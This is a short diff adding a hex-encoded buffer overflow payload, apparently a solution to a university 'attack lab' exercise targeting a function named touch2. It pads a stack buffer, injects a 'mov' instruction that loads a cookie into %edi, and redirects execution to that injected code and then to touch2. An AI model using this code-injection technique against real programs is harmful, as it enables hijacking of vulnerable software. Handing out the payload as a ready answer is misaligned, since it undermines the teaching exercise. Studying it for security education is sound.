@@ -1,0 +1,9 @@
+33 33 33 33 33 33 33 33 33    /* Padding               */
+33 33 33 33 33 33 33 33 33    /* Padding               */
+33 33 33 33 33 33 33 33 33    /* Padding               */
+33 33 33 33 33 33 33          /* Padding               */
+bf 88 7a 22 43                /* mov $0x43227a88, %edi */
+c3                            /* retq                  */
+aa f9 60 55                   /* Store cookie in %edi  */
+00 00 00 00                   /* Padding               */
+bc 18 40 00                   /* Return to touch2      */
